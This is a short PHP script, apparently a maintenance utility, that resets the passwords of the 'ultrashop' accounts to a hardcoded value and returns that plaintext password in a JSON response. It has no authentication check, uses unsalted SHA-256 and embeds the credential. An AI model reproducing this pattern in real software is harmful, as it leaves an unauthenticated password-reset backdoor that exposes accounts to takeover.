<?php
require_once 'config.php';
header('Content-Type: application/json');

$passHash = hash('sha256', 'novaled');
$stmt = $pdo->prepare("UPDATE `usuarios` SET `passwordHash` = ? WHERE `username` IN ('ultrashop', 'ultrashop@gmail.com')");
$stmt->execute([$passHash]);

echo json_encode(['success' => true, 'updated' => $stmt->rowCount(), 'pass' => 'novaled']);
?>
